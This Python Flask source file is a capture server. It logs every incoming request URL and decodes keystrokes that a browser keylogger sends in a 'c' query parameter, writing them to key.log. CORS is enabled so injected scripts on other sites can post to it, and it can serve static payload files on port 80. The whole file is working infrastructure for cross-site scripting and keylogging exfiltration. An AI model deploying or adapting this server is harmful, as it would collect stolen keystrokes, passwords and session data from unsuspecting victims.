"""Run a server that takes all GET requests and dumps them."""

from json import loads

from flask import Flask, request, send_from_directory

from flask_cors import CORS
from w3lib.html import replace_entities

# Run the Flask server and ensure cross-origin resource sharing is okay.

app = Flask(__name__)
CORS(app)

# Set serve message on GET request.
with open("message.txt") as f:
    message = f.read().rstrip()

# Serve the app to the root path.


@app.route('/')
def route():
    """Get all GET requests and dump them to logs."""
    # Unescape HTML and write to log.
    with open("cap.log", "a") as f:
        f.write(replace_entities(str(request.url)) + "\n")

    # If we think a keylogger (param: 'c') is trying to get us information...
    with open("key.log", "a") as f:
        if "c" in request.args:
            keys = loads(replace_entities(request.args.get('c')))

            # From the JSON list get only keys pressed. If impossible, stop.
            try:
                keys = "".join(keys)
                f.write(keys + '\n')
            except Exception:
                pass

    return message

# Comment below if you would not like to serve static content through the
# static folder. Note that this can be a security vulnerability.
#
# e.g.: ./server/static/test.txt may be at http://localhost/test.txt.


@app.route('/<path:path>')
def staticserve(path):
    """Serve a file from your static directory."""
    return app.send_static_file(path)


if __name__ == "__main__":
    # Must be run with sudo/root.
    app.run(host='0.0.0.0', port=80)
